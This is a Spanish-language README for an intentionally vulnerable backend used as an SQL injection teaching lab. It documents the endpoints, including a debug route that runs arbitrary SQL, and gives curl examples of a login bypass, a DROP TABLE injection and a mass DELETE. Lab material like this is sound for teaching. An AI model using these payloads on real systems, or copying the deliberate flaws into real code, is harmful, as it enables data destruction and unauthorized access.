```markdown
# project_progral_backend

Este backend es un **laboratorio** para explorar vulnerabilidades de inyección SQL.

## 🔧 Requisitos
- Java 20
- Maven 3.x
- PostgreSQL (o usar la base de datos en la nube ya configurada)

## 🚀 Instalación y ejecución
1. Clona el repo:
   ```bash
git clone <url-del-repo>
cd project_progral_backend
```
2. Ajusta `src/main/resources/application.properties` si cambias la conexión.
3. Compila:
   ```bash
mvn clean package
```
4. Lanza la app:
   ```bash
java -jar target/backend-1.0.0.jar
```

Quedará en `http://localhost:8080/`.

## 📋 Endpoints
### Autenticación
- `POST /api/login`
    - Body JSON: `{ "username": "admin", "password": "admin123" }`
    - Respuesta: `OK` o `FAIL`

### Productos (CRUD)
1. `GET /api/products`
2. `GET /api/products/{id}`
3. `POST /api/products`  
   Body: `{ "name":"X","description":"Y","price":9.99 }`
4. `PUT /api/products/{id}`  
   Body igual al POST.
5. `DELETE /api/products/{id}`

### Búsqueda vulnerable
- `GET /api/search/products?name=<texto>`

### Debug SQL
- `POST /api/debug/query`  
  Body: `{ "sql": "TU SQL AQUÍ" }`
    - Retorna lista de filas o `{ "error": "mensaje" }`.

## 💥 Ejemplos de Inyección desde Postman o CURL

1. **Bypass login**
   ```bash
curl -X POST http://localhost:8080/api/login \
-H "Content-Type: application/json" \
-d '{ "username": "' OR '1'='1", "password": "foo" }'
```  
   Responde `OK` sin creds.

2. **Crear producto malicioso**
   ```bash
curl -X POST http://localhost:8080/api/products \
  -H "Content-Type: application/json" \
  -d '{ "name": "Test'); DROP TABLE products; --","description":"x","price":1 }'
```  
Esto podría eliminar la tabla `products`.

3. **Consulta directa**
   ```bash
curl -X POST http://localhost:8080/api/debug/query \
-H "Content-Type: application/json" \
-d '{ "sql": "SELECT count(*) FROM users" }'
```  
   Devuelve: `[ { "count": 1 } ]` o similar.

4. **Eliminar todo el catálogo**
   - Usando Postman: método POST, URL `/api/debug/query`, Body raw JSON:
     ```json
{ "sql": "DELETE FROM products WHERE 1=1" }
     ```

5. **Prueba de error sintaxis**
   ```bash
curl -X POST http://localhost:8080/api/debug/query \
  -H "Content-Type: application/json" \
  -d '{ "sql": "INVALID SQL" }'
```  
Retorna: `{ "error": "..." }`, pero el backend sigue vivo.

---

> **Nota**: este proyecto conserva todas las vulnerabilidades a propósito. ¡Disfruta aprendiendo cómo explotarlas y luego cómo mitigarlas!
```
